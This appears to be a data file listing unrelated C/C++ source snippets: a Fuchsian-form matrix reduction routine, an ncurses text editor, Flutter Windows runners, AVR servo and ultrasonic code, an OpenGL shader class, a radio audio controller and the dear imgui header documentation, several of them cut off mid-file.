    "#include <iostream>\n#include \"mpc.h\"\n\nusing namespace std;\n\n#include \"global_vars.h\"\n#include \"malloc_defs.h\"\n#include \"utils.h\"\n#include \"tensor_utils.h\"\n#include \"system_analyzer.h\"\n#include \"poly_frac.h\"\n#include \"normalize.h\"\n#include \"jordan_wrp.h\"\nextern \"C\" {\n  #include \"algebra.h\"\n  // #include \"jordan.h\"\n  #include \"cpoly.h\"\n  #include \"rel_err_mpc.h\"\n  // #include \"in_out.h\"\n}\n\n// needed for Jordan decomposition\nstatic int c__0 = 0;\n\n\n//////\n// POLY_FRAC NORMALIZE\n/////\nvoid pf_to_Fuchsian(\n  // OUTPUT\n  struct poly_frac **bal,\n  struct poly_frac **inv_bal,\n  // IN-OUT\n  struct poly_frac **matb,\n  // INPUT\n  int b_len,\n  mpc_t *roots, int nroots\n) {\n  /*\n  Tranform the input square matrix to Fuchsian form, providing in output\n  the direct and the inverse transformation matrices. The transformation\n  law is:\n  \n    M' = invT*M*T - invT*Derivate[T]\n    \n  OUTPUT:\n    - bal, inv_bal: rk2 tensors of polynomial fractions corresponding to\n      the balance transformation and its inverse, respectively;\n  IN-OUT:\n    - matb: rk2 of polynomial fractions to be transfromed, overwritten\n      by the transformed matrix;\n  INPUT:\n    - b_len: dimension of the square matrices;\n    - roots: array containing the poles of the global matrix (where the\n      1st element is zero);\n    - nroots: number of poles of the global matrix;\n  */\n  int print = 0;\n  int b_len2 = b_len*b_len;\n  int p_rank;\n  int index;\n  // leading and next-to-leading orders\n  mpfr_t *A0r, *A0i;\n  mpc_t **A1;\n  A0r = new mpfr_t[b_len2];\n  A0i = new mpfr_t[b_len2];\n  init_rk1_mpfr(A0r, b_len2);\n  init_rk1_mpfr(A0i, b_len2);\n  malloc_rk2_tens(A1, b_len, b_len);\n  init_rk2_mpc(A1, b_len, b_len);\n  // projector\n  mpc_t **proj;\n  malloc_rk2_tens(proj, b_len, b_len);\n  init_rk2_mpc(proj, b_len, b_len);\n  // utilities\n  mpc_t mpc_one;\n  mpc_init3(mpc_one, wp2, wp2);\n  mpc_set_ui(mpc_one, 1, MPFR_RNDN);\n  struct poly_frac pf_one;\n  poly_frac_build(&pf_one);\n  poly_frac_set_ui(&pf_one, 1, nroots);\n  // contributions to the transformation matrices\n  struct poly_frac **proj_mat, **mat_proj, **proj_mat_proj;\n  malloc_rk2_tens(proj_mat, b_len, b_len);\n  poly_frac_rk2_build(proj_mat, b_len, b_len);\n  malloc_rk2_tens(mat_proj, b_len, b_len);\n  poly_frac_rk2_build(mat_proj, b_len, b_len);\n  malloc_rk2_tens(proj_mat_proj, b_len, b_len);\n  poly_frac_rk2_build(proj_mat_proj, b_len, b_len);\n  struct poly_frac **der_contr;\n  malloc_rk2_tens(der_contr, b_len, b_len);\n  poly_frac_rk2_build(der_contr, b_len, b_len);\n\n  int wp_bin = - mpfr_log2_int(mpfr_tol);\n\n  int num_it = 0;\n  while (1) {\n    // compute Poinc. rank\n    // p_rank = mp_Poinc_rank(mults, b_len, b_len);\n    poly_frac_rk2_prune_rel_tol(matb, wp_bin, b_len, b_len);\n    p_rank = poly_frac_Poinc_rank(matb, b_len, b_len);\n    if (print) {\n    cout << \"p_rank = \" << p_rank << endl;\n    cout << \"pf block:\" << endl;\n    poly_frac_rk2_print(matb, b_len, b_len);\n    }\n    // getchar();\n    if (p_rank <= 0) {\n      if (num_it == 0) {\n        // set transformation matrices to identity\n        poly_frac_rk2_set_id(bal, b_len, nroots);\n        poly_frac_rk2_set_id(inv_bal, b_len, nroots);\n      }\n      break;\n    }\n\n    // EXTRACT LO AND NLO\n    poly_frac_rk2_prune_rel_tol(matb, wp_bin, b_len, b_len);\n    rel_err_poly_frac_mat_extract_LO(\n      A0r, A0i,\n      matb, roots, p_rank+1,\n      b_len, b_len\n      , wp_bin\n    );\n    if (print || dbg) {\n    cout << \"Leading Order:\" << endl;\n    for (int i=0; i<b_len; i++) {\n      cout << \"i = \" << i << endl;\n      for (int j=0; j<b_len; j++) {\n        cout << \"j = \" << j << endl;\n        index = i + b_len*j;\n        mpfr_out_str(stdout, 10, 0, A0r[index], MPFR_RNDN);\n        cout << endl;\n        mpfr_out_str(stdout, 10, 0, A0i[index], MPFR_RNDN);\n        cout << endl;\n      }\n    }\n    cout << endl;\n    }\n    // poly_frac_mat_extract_NLOc(\n    rel_err_poly_frac_mat_extract_NLOc(\n      A1,\n      A0r, A0i, matb, roots, p_rank+1,\n      b_len, b_len\n      , wp_bin\n    );\n    if (print || dbg) {\n    cout << \"A1:\" << endl; print_rk2_mpc(A1, b_len, b_len); cout << endl;\n    }\n\n    // cout << \"finding projector...\" << endl;\n    find_projector(proj, A0r, A0i, A1, b_len);\n    if (print || dbg) {\n    cout << \"projector:\" << endl;\n    print_rk2_mpc(proj, b_len, b_len);\n    }\n\n    // apply balance transformation\n    //// build (eta-1)*proj*mat\n    // cout << endl;\n    // cout << \"build proj*mat\" << endl;\n    rel_err_mpc_rk2_mul_poly_frac_rk2(\n      proj_mat, proj, matb, b_len,\n      roots,\n      wp_bin\n    );\n    //// build mat*proj\n    // cout << endl;\n    // cout << \"build mat*proj\" << endl;\n    rel_err_poly_frac_rk2_mul_mpc_rk2(\n      mat_proj, matb, proj, b_len,\n      roots,\n      wp_bin\n    );\n    //// build proj*mat*proj\n    // cout << endl;\n    // cout << \"build proj*mat*proj\" << endl;\n    rel_err_poly_frac_rk2_mul_mpc_rk2(\n      proj_mat_proj, proj_mat, proj, b_len,\n      roots,\n      wp_bin\n    );\n    //// multiply f(eta) factors\n    // cout << endl;\n    // cout << \"multiply eta",
    "// INCLUDES\n// {{{\n#include <ncurses.h>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <stdlib.h>\n#include <unistd.h>\n#include <functional>\n#include <map>\n#include <sstream>\n// }}}\n\n// CONST VARIABLES\n// {{{\nconst unsigned short TAB_SIZE = 4;\nunsigned short h, w;\n// }}}\n\n// FUNCTIONS\n// {{{\ninline void insert();\ninline void handle_command(std::string command);\ninline void command();\ninline void moveLeft();\ninline void moveDown();\ninline void moveUp();\ninline void moveRight();\ninline void clearline();\ninline void scrrend();\ninline void saveF(std::string file);\ninline void loadF(std::string file);\ninline void insertBefore();\ninline void insertAfter();\n// }}}\n\n// STRUCTS\n// {{{\n\n//buffer\n// {{{\nclass buffer\n{\npublic:\n\tstd::string name;\n\tstd::vector <std::string> content;\n\tstd::string path;\n\tunsigned x = 0, y = 0, toprend = 0;\n\tbuffer()\n\t{\n\t\tthis -> name = \"\";\n\t\tthis -> content = {\"\"};\n\t}\n\tbuffer(std::string title, std::vector <std::string> cont)\n\t{\n\t\tthis -> name = title;\n\t\tfor (auto& line : cont)\n\t\t{\n\t\t\tthis -> content.push_back(line);\n\t\t}\n\t}\n};\n// }}}\n\n// register\n// {{{\nstruct reg\n{\n\tstd::vector <std::string> content;\n\tvoid copy(buffer& copyfrom, unsigned startL, unsigned endL)\n\t{\n\t\tcontent.clear();\n\t\tfor (; startL <= endL; ++startL)\n\t\t{\n\t\t\tcontent.push_back(copyfrom.content[startL]);\n\t\t}\n\t}\n\tvoid paste(buffer& pasteTo)\n\t{\n\t\tfor (const auto& line : content)\n\t\t{\n\t\t\tpasteTo.content.insert(pasteTo.content.begin() + pasteTo.y, line);\n\t\t\tpasteTo.y++;\n\t\t}\n\t}\n};\n// }}}\n\n// keybind\n// {{{\nclass keybind\n{\npublic:\n\tusing CommandFunction = std::function<void()>;\n\n\tvoid bind(const std::string& keySequence, CommandFunction command)\n\t{\n\t\tbindings[keySequence] = command;\n\t}\n\n\tbool execute(const std::string& keySequence)\n\t{\n\t\tauto it = bindings.find(keySequence);\n\t\tif (it != bindings.end())\n\t\t{\n\t\t\tit -> second();\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n\n\tvoid loadBindingsFromFile(const std::string& filename)\n\t{\n\t\tstd::ifstream file(filename);\n\t\tif (!file.is_open())\n\t\t{\n\t\t\tmove(h - 1, 0);\n\t\t\tprintw(\"Bind file not found\");\n\t\t\treturn;\n\t\t}\n\n\t\tstd::string line;\n\t\twhile (std::getline(file, line))\n\t\t{\n\t\t\tparseLine(line);\n\t\t}\n\t\tfile.close();\n\t}\n\n\tvoid bindDefaultActions()\n\t{\n\t\tbind(\"h\", moveLeft);\n\t\tbind(\"j\", moveDown);\n\t\tbind(\"k\", moveUp);\n\t\tbind(\"l\", moveRight);\n\t\tbind(\":\", command);\n\t\tbind(\"i\", insertBefore);\n\t\tbind(\"a\", insertAfter);\n\t}\n\nprivate:\n\tstd::map <std::string, CommandFunction> bindings;\n\n\tvoid parseLine(const std::string& line)\n\t{\n\t\tstd::istringstream iss(line);\n\t\tstd::string command, keySequence;\n\n\t\tif (iss >> command && command == \"bind\")\n\t\t{\n\t\t\tstd::getline(iss, keySequence, '\"');\n\t\t\tstd::getline(iss, keySequence, '\"');\n\t\t\tstd::string funcCall;\n\t\t\tstd::getline(iss, funcCall);\n\n\t\t\tfuncCall.erase(0, funcCall.find_first_not_of(\" \\t\"));\n\n\t\t\tif (funcCall.back() == ')')\n\t\t\t{\n\t\t\t\tbind(keySequence, [funcCall]() {});\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tbind(keySequence, [funcCall]() {});\n\t\t\t}\n\t\t}\n\t}\n};\n// }}}\n\n// }}}\n\n// GLOBAL VARIABLES\n// {{{\nstd::vector <buffer> buffers;\nreg registers[26];\nreg clipboard;\nint cb = 0;\nchtype c;\nstd::string keyseq;\n// }}}\n\n// MAIN\n// {{{\nint main()\n{\n\tinitscr();\n\tcbreak();\n\tnoecho();\n\tkeypad(stdscr, TRUE);\n\tgetmaxyx(stdscr, h, w);\n\n\tbuffers.push_back(buffer(\"0\", {\"\"}));\n\tkeybind kb;\n\tkb.bindDefaultActions();\n\tkb.loadBindingsFromFile(\"~/C++/text_editor/bind\");\n\twhile (1)\n\t{\n\t\tscrrend();\n\t\tc = getch();\n\t\tkeyseq.push_back(c);\n\t\tif (kb.execute(keyseq) || \n\t\t\tkeyseq.size() > 1 && kb.execute(keyseq.substr(1)) || \n\t\t\tkeyseq.size() > 2 && kb.execute(keyseq.substr(2)) || \n\t\t\tkeyseq.size() == 3)\n\t\t{\n\t\t\tkeyseq.clear();\n\t\t}\n\t}\n\tscrrend();\n\tendwin();\n\treturn 1;\n}\n// }}}\n\n// Clear the current line\n// {{{\ninline void clearline()\n{\n\tfor (unsigned short i = 0; i < w; ++i)\n\t{\n\t\taddch(' ');\n\t}\n}\n// }}}\n\n// Render the screen\n// {{{\ninline void scrrend()\n{\n\tif (buffers[cb].toprend > buffers[cb].y)\n\t{\n\t\tbuffers[cb].toprend = buffers[cb].y;\n\t}\n\telse if (buffers[cb].toprend + h - 2 < buffers[cb].y)\n\t{\n\t\tbuffers[cb].toprend = buffers[cb].y - (h - 2);\n\t}\n\n\tfor (unsigned short i = 0; i < h - 1; ++i)\n\t{\n\t\tmove(i, 0);\n\t\tclearline();\n\t\tmove(i, 0);\n\t\tif (i + buffers[cb].toprend >= buffers[cb].content.size())\n\t\t{\n\t\t\taddch('~');\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintw(buffers[cb].content[i + buffers[cb].toprend].c_str());\n\t\t}\n\t}\n\n\tmove(buffers[cb].y - buffers[cb].toprend, buffers[cb].x);\n}\n// }}}\n\n// Save the current buffer to a file\n// {{{\ninline void saveF(std::string file)\n{\n\tstd::ofstream ofs(buffers[cb].path);\n\tfor (const auto& line : buffers[cb].content)\n\t{\n\t\tofs << line << '\\n';\n\t}\n\tofs.close();\n}\n// }}}\n\n// Load text from a file to the current buffer\n// {{{\ninline void loadF(std::string file)\n{\n\tstd::ifstream ifs(file);\n\tstd::string wd = std::string(getcwd(nullptr, 0));\n\tbuffers[cb].path = wd + \"/\" + file;\n\tif (!ifs)\n\t{\n\t\tbuffers.push_back({file, {\"\"}});\n\t\tcb = buffers.size() - 1;\n\t\tmove(h - 1, 0);\n\t\tclearline();\n\t\tmove(h - 1, 0);\n\t\tprintw(file.c_str());\n\t\tprintw(\" [new]\");\n\t\treturn;\n\t}\n\t\n\tbuffers[cb].content.clear();\n\tstd::st",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fitter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <avr/io.h>\r\n#include <util/delay.h>\r\n\r\n#define F_CPU 16000000UL\r\n\r\n#define SERVO_PIN     PB1   // Pin for the servo (OC1A, Pin 9 on Arduino Uno)\r\n#define TRIGGER PD5\r\n#define ECHO PD6\r\n\r\nvoid servoInit()\r\n{\r\n  DDRB |= (1 << SERVO_PIN);\r\n  PORTB |= (1<<SERVO_PIN);\r\n}\r\n\r\nvoid rotateServo(int angle)\r\n{\r\n  for(int i=0;i<50;i++)\r\n  {\r\n    switch(angle)\r\n    {\r\n     case 0:\r\n         PORTB |= (1<<SERVO_PIN);  \r\n         _delay_ms(0); \r\n         PORTB &= ~(1<<SERVO_PIN);\r\n         _delay_ms(20); \r\n      break;\r\n      case 45:\r\n         PORTB |= (1<<SERVO_PIN);  \r\n         _delay_ms(1); \r\n         PORTB &= ~(1<<SERVO_PIN);\r\n         _delay_ms(19); \r\n      break;\r\n      case 90:\r\n         PORTB |= (1<<SERVO_PIN);  \r\n         _delay_ms(1.5); \r\n         PORTB &= ~(1<<SERVO_PIN);\r\n         _delay_ms(18.5); \r\n      break;\r\n      case 135:\r\n         PORTB |= (1<<SERVO_PIN);  \r\n         _delay_ms(2); \r\n         PORTB &= ~(1<<SERVO_PIN);\r\n         _delay_ms(18); \r\n      break;\r\n      case 180:\r\n         PORTB |= (1<<SERVO_PIN);  \r\n         _delay_ms(2.5); \r\n         PORTB &= ~(1<<SERVO_PIN);\r\n         _delay_ms(17.5); \r\n      break;\r\n    }\r\n    _delay_ms(50);\r\n  }\r\n}\r\n\r\nvoid ultrasonicInit()\r\n{\r\n  DDRD |= (1 << TRIGGER);\r\n  PORTD &= ~(1 << TRIGGER);\r\n  DDRD &= ~(1 << ECHO);\r\n}\r\n\r\nvoid triggerUltrasonic()\r\n{\r\n  PORTD |= (1 << TRIGGER);\r\n  _delay_us(10);\r\n  PORTD &= ~(1 << TRIGGER);\r\n}\r\n\r\nuint16_t echoUltrasonicDuration()\r\n{\r\n  while (!(PIND & (1 << ECHO)));\r\n  TCCR1B |= ((1 << CS11) | (1 << CS10));\r\n  TCNT1 = 50536;\r\n  while (PIND & (1 << ECHO));\r\n  return (TCNT1-50536);\r\n}\r\n\r\ndouble distanceUltrasonic()\r\n{\r\n  uint16_t counts;\r\n  \r\n  triggerUltrasonic();\r\n  counts = echoUltrasonicDuration();\r\n  return(counts*4/58.0);\r\n}\r\n\r\n\r\n\r\nint main(void) \r\n{\r\n  double distance;\r\n    \r\n  servoInit();\r\n  ultrasonicInit();\r\n  while (1) \r\n  {\r\n    distance = distanceUltrasonic();\r\n    if(distance<=5)\r\n      rotateServo(90);\r\n    else\r\n      rotateServo(0);\r\n  }\r\n  return 0;\r\n}\r\n",
    "#include \"shader.hpp\"\n\n#include <fstream>\n#include <sstream>\n#include <iostream>\n\nRenderer::Shader::Shader(std::string vertexPath, std::string fragmentPath){\n\n    // retrieve the vertex/fragment source code from filePath\n    std::string vertexCode;\n    std::string fragmentCode;\n    std::ifstream vShaderFile;\n    std::ifstream fShaderFile;\n\n    // ensure ifstream objects can throw exceptions:\n    vShaderFile.exceptions (std::ifstream::failbit | std::ifstream::badbit);\n    fShaderFile.exceptions (std::ifstream::failbit | std::ifstream::badbit);\n\n    try {\n        // open files\n        vShaderFile.open(vertexPath);\n        fShaderFile.open(fragmentPath);\n        std::stringstream vShaderStream, fShaderStream;\n\n        // read file\u2019s buffer contents into streams\n        vShaderStream << vShaderFile.rdbuf();\n        fShaderStream << fShaderFile.rdbuf();\n\n        // close file handlers\n        vShaderFile.close();\n        fShaderFile.close();\n\n        // convert stream into string\n        vertexCode = vShaderStream.str();\n        fragmentCode = fShaderStream.str();\n    }\n    catch(std::ifstream::failure e) {\n        std::cout << \"ERROR::SHADER::FILE_NOT_SUCCESFULLY_READ\" << std::endl;\n    }\n\n    const char* vShaderCode = vertexCode.c_str();\n    const char* fShaderCode = fragmentCode.c_str();\n\n    // 2. compile shaders\n    unsigned int vertex, fragment;\n    int success;\n    char infoLog[512];\n\n    // vertex Shader\n    vertex = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertex, 1, &vShaderCode, NULL);\n    glCompileShader(vertex);\n\n    // print compile errors\n    glGetShaderiv(vertex, GL_COMPILE_STATUS, &success);\n    if (!success) {\n        glGetShaderInfoLog(vertex, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" << infoLog << \"\\n\";\n    };\n\n    // fragment shader\n    fragment = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragment, 1, &fShaderCode, NULL);\n    glCompileShader(fragment);\n\n    // print compile errors\n    glGetShaderiv(fragment, GL_COMPILE_STATUS, &success);\n    if (!success){\n        glGetShaderInfoLog(fragment, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n\" << infoLog << \"\\n\";\n    }\n\n    ID = glCreateProgram();\n    glAttachShader(ID, vertex);\n    glAttachShader(ID, fragment);\n    glLinkProgram(ID);\n\n    // print linking errors if any\n    glGetProgramiv(ID, GL_LINK_STATUS, &success);\n    if (!success)\n    {\n        glGetProgramInfoLog(ID, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::PROGRAM::LINKING_FAILED\\n\" << infoLog << \"\\n\";\n    }\n\n    // delete shaders; they\u2019re linked into our program and no longer necessary\n    glDeleteShader(vertex);\n    glDeleteShader(fragment);\n\n    glUseProgram(ID);\n    \n}\n\nvoid Renderer::Shader::use(){\n    glUseProgram(ID);\n}\n\nvoid Renderer::Shader::setBool(const std::string &name, bool value) const {         \n    glUniform1i(glGetUniformLocation(ID, name.c_str()), (int)value); \n}\nvoid Renderer::Shader::setInt(const std::string &name, int value) const{ \n    glUniform1i(glGetUniformLocation(ID, name.c_str()), value); \n}\nvoid Renderer::Shader::setFloat(const std::string &name, float value) const { \n    glUniform1f(glGetUniformLocation(ID, name.c_str()), value); \n}\nvoid Renderer::Shader::setVec2(const std::string &name, const glm::vec2 &value) const { \n    glUniform2fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]); \n}\nvoid Renderer::Shader::setVec3(const std::string &name, const glm::vec3 &value) const { \n    glUniform3fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]); \n}\nvoid Renderer::Shader::setVec4(const std::string &name, const glm::vec4 &value) const { \n    glUniform4fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]); \n}\nvoid Renderer::Shader::setMat2(const std::string &name, const glm::mat2 &mat) const {\n    glUniformMatrix2fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\nvoid Renderer::Shader::setMat3(const std::string &name, const glm::mat3 &mat) const {\n    glUniformMatrix3fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\nvoid Renderer::Shader::setMat4(const std::string &name, const glm::mat4 &mat) const {\n    glUniformMatrix4fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"saurav\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"AudioModeControllerRadio.h\"\n\nvoid AudioModeControllerRadio::enter()\n{\n  setMixerGains();\n  configureCodec();\n  updateOutputVolume();\n  setDisplayTheme();\n  i2c.setCurrentMode(MODE_RADIO);\n  if (!radio.isInitialized())\n  {\n    radio.init();\n  }\n}\n\nvoid AudioModeControllerRadio::exit()\n{\n}\n\nvoid AudioModeControllerRadio::loop()\n{\n  if (!radio.isInitialized())\n  {\n    radio.init();\n  }\n  else\n  {\n    radio.update();\n  }\n}\n\nvoid AudioModeControllerRadio::frameLoop()\n{\n  if (radio.newRDSMsg || radio.newStationName || SNVS_LPGPR0 != freq)\n  {\n    char freqDisplay[30];\n    sprintf(freqDisplay, \"%s Mhz %s\", radio.getFrequencyString(), radio.stationName != nullptr ? radio.stationName : (char *)\"\");\n    display.setMetadata(isMuted ? (char *)\"Muted (Play to unmute)\" : (radio.rdsMsg != nullptr ? radio.rdsMsg : (char *)\"\"), freqDisplay);\n  }\n\n  // Check for favorite save\n  if (orangeButtonPressed && orangeButtonTimer >= 3000)\n  {\n    orangeButtonPressed = false; // Reset to prevent multiple saves\n    SNVS_LPGPR2 = SNVS_LPGPR0;          // Save current frequency\n    display.setTemporaryMetadata(\"Favorite saved\", \"Short press to load\", 3000);\n    playBeep();\n  }\n}\n\nvoid AudioModeControllerRadio::handleOrangeButton(bool pressed)\n{\n  if (pressed)\n  {\n    orangeButtonPressed = true;\n    orangeButtonTimer = 0;\n    display.setTemporaryMetadata(\"Favorite\", \"Hold to set\", 3000);\n  }\n  else\n  {\n    display.clearTemporaryMetadata();\n    if (orangeButtonTimer < 3000)\n    {\n      // Short press - load favorite\n      uint32_t savedFreq = SNVS_LPGPR2;\n      if (savedFreq >= 8760 && savedFreq <= 10800)\n      {\n        radio.resetRDSData();\n        radio.setFrequency(savedFreq);\n        radio.waitSeekComplete();\n        char freqStr[12];\n        sprintf(freqStr, \"%s Mhz\", radio.getFrequencyString());\n        display.setTemporaryMetadata(freqStr, \"Favorite loaded\", 3000);\n      }\n      else\n      {\n        display.setTemporaryMetadata(\"No favorite found\", \"Hold to set\", 3000);\n      }\n    }\n    orangeButtonPressed = false;\n  }\n}\n\nvoid AudioModeControllerRadio::handleControl(ControlCommand cmd)\n{\n  switch (cmd)\n  {\n  case PREV:\n    radio.resetRDSData();\n    radio.seek(false);\n    break;\n  case PLAY:\n    isMuted = !isMuted;\n    updateOutputVolume();\n    display.setTemporaryMetadata(isMuted ? \"Muted\" : \"Unmuted\", \"\", 1000);\n    break;\n  case NEXT:\n    radio.resetRDSData();\n    radio.seek(true);\n    break;\n  default:\n    break;\n  }\n}\n\nvoid AudioModeControllerRadio::setMixerGains()\n{\n  auto *mono = audio.getMonoDownmixer();\n  auto *main = audio.getMainMixer();\n  auto *fftInput = audio.getFFTInputMixer();\n  mono->gain(0, 0.0); // BT audio L\n  mono->gain(1, 0.0); // BT audio R\n  mono->gain(2, 0.5); // Radio audio L\n  mono->gain(3, 0.5); // Radio audio R\n  main->gain(0, 1.0); // Radio audio\n  main->gain(1, 0.0); // SD card audio L\n  main->gain(2, 0.0); // SD card audio R\n  main->gain(3, 0.5); // In memory audio\n\n  fftInput->gain(0, 1.0); // BT/SD/Radio source\n  fftInput->gain(1, 0.0); // Mic source\n}\n",
    "// dear imgui, v1.90.8\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\n// - Homepage ................... https://github.com/ocornut/imgui\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\n// - Gallery .................... https://github.com/ocornut/imgui/issues/7503 (please post your screenshots/video there!)\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ID STACK\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG 